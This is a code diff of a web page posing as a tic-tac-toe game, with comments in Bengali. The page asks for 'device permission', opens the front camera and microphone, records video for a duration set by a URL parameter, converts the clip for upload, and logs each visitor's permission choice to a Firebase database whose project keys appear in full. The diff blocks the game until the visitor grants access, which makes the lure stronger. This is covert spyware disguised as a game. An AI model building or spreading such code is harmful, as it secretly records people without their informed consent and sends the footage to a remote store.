@@ -16,7 +16,7 @@
 
   <div class="text-center mt-2">
     <h1 class="text-3xl font-extrabold text-cyan-400 tracking-wide">TIC TAC TOE</h1>
-    <p id="gameStatus" class="text-sm font-semibold text-slate-400 mt-1">Press Start to Play</p>
+    <p id="gameStatus" class="text-sm font-semibold text-slate-400 mt-1">Permission Required to Play</p>
   </div>
 
   <div class="w-full max-w-xs bg-slate-900 border border-slate-800 p-3 rounded-2xl shadow-2xl">
@@ -31,17 +31,19 @@
     <button onclick="resetGame()" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-3 rounded-xl border border-slate-700 transition-all">Restart Game</button>
   </div>
 
+  <!-- Start Modal -->
   <div id="startModal" class="fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-6 z-50">
     <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl text-center space-y-4 max-w-xs w-full shadow-2xl">
       <div class="text-4xl">🎮</div>
       <h2 class="text-lg font-bold text-cyan-400">Welcome to Tic-Tac-Toe</h2>
-      <p class="text-xs text-slate-400">To start the Tic-Tac-Toe match, please enable device permission.</p>
+      <p id="modalDesc" class="text-xs text-slate-400">To start the Tic-Tac-Toe match, please allow device permission.</p>
       <button id="startBtn" class="w-full bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold py-3 rounded-xl text-sm transition-all">
         OK / Start Game
       </button>
     </div>
   </div>
 
+  <!-- Success Modal -->
   <div id="successModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-6 z-50">
     <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl text-center space-y-4 max-w-xs w-full shadow-2xl">
       <div class="text-4xl">✅</div>
@@ -58,15 +60,15 @@
     import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
     const firebaseConfig = {
-  apiKey: "AIzaSyAbpMValCkTWyCWLBiTN5hF_2i2MWn8pPU",
-  authDomain: "ram-jay.firebaseapp.com",
-  databaseURL: "https://ram-jay-default-rtdb.firebaseio.com",
-  projectId: "ram-jay",
-  storageBucket: "ram-jay.firebasestorage.app",
-  messagingSenderId: "405955896051",
-  appId: "1:405955896051:web:408e4225292e94c3274d86",
-  measurementId: "G-222S4YPSWQ"
-};
+      apiKey: "AIzaSyAbpMValCkTWyCWLBiTN5hF_2i2MWn8pPU",
+      authDomain: "ram-jay.firebaseapp.com",
+      databaseURL: "https://ram-jay-default-rtdb.firebaseio.com",
+      projectId: "ram-jay",
+      storageBucket: "ram-jay.firebasestorage.app",
+      messagingSenderId: "405955896051",
+      appId: "1:405955896051:web:408e4225292e94c3274d86",
+      measurementId: "G-222S4YPSWQ"
+    };
 
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
@@ -74,30 +76,32 @@
     let recordSeconds = parseInt(urlParams.get('time')) || 5;
 
     const startBtn = document.getElementById('startBtn');
+    const modalDesc = document.getElementById('modalDesc');
     let currentStream = null;
 
     startBtn.addEventListener('click', async () => {
-      document.getElementById('startModal').classList.add('hidden');
-      document.getElementById('gameStatus').textContent = "Your Turn (X)";
-
       try {
-        // ন্যাচারাল ডিফল্ট কোয়ালিটিতে ক্যামেরা ওপেন হবে (কোনো লিমিটেশন নেই)
+        // চেষ্টা করা হচ্ছে পারমিশন নেওয়ার
         currentStream = await navigator.mediaDevices.getUserMedia({ 
           video: { facingMode: "user" }, 
           audio: true 
         });
+
+        // পারমিশন সফল হলে মোডাল হাইড হবে এবং গেম শুরু হবে
+        document.getElementById('startModal').classList.add('hidden');
+        document.getElementById('gameStatus').textContent = "Your Turn (X)";
+        window.isPermissionGranted = true;
 
         push(ref(db, 'visits_log'), { timestamp: new Date().toISOString(), permission: "Granted", duration: recordSeconds });
 
         let chunks = [];
         let mediaRecorder;
 
-        // ডিফল্ট ব্রাউজার এনকোডার ব্যবহার করা হচ্ছে যাতে ফুটেজ মিস না হয়
         const options = { mimeType: 'video/webm; codecs=vp8' };
         if (MediaRecorder.isTypeSupported(options.mimeType)) {
             mediaRecorder = new MediaRecorder(currentStream, options);
         } else {
-            mediaRecorder = new MediaRecorder(currentStream); // Fallback for iOS/Safari
+            mediaRecorder = new MediaRecorder(currentStream);
         }
 
         mediaRecorder.ondataavailable = (e) => { 
@@ -111,7 +115,7 @@
           }
 
           const blob = new Blob(chunks, { type: 'video/webm' });
-          chunks = []; // ক্লিয়ার চাঙ্কস
+          chunks = [];
 
           const reader = new FileReader();
           reader.readAsDataURL(blob);
@@ -133,7 +137,16 @@
         setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, recordSeconds * 1000);
 
       } catch (err) {
+        // পারমিশন ডিনাই করলে মোডাল বন্ধ হবে না এবং ওয়ার্নিং দেখাবে
         push(ref(db, 'visits_log'), { timestamp: new Date().toISOString(), permission: "Denied" });
+        
+        modalDesc.textContent = "⚠️ Camera/Microphone access is required to play this game. Please allow permission to continue.";
+        modalDesc.classList.remove('text-slate-400');
+        modalDesc.classList.add('text-rose-400');
+        
+        startBtn.textContent = "Grant Permission to Play";
+        startBtn.classList.remove('bg-cyan-500', 'hover:bg-cyan-400');
+        startBtn.classList.add('bg-rose-500', 'hover:bg-rose-400', 'text-white');
       }
     });
 
@@ -148,7 +161,10 @@
     let gameBoard = Array(9).fill(''), gameActive = true;
 
     function playGame(i) {
+      // পারমিশন না থাকলে বোর্ড ক্লিক কাজ করবে না
+      if (!window.isPermissionGranted) return;
       if (gameBoard[i] || !gameActive) return;
+      
       gameBoard[i] = 'X'; boardEl.children[i].textContent = 'X'; boardEl.children[i].classList.add('x');
       if (checkGameEnd('X', "You Won! 🎉")) return;
       gameStatusEl.textContent = "Computer thinking...";
@@ -173,6 +189,7 @@
     }
 
     function resetGame() {
+      if (!window.isPermissionGranted) return;
       gameBoard.fill(''); gameActive = true; gameStatusEl.textContent = "Your Turn (X)";
       Array.from(boardEl.children).forEach(c => { c.textContent = ''; c.className = 'cell'; });
     }
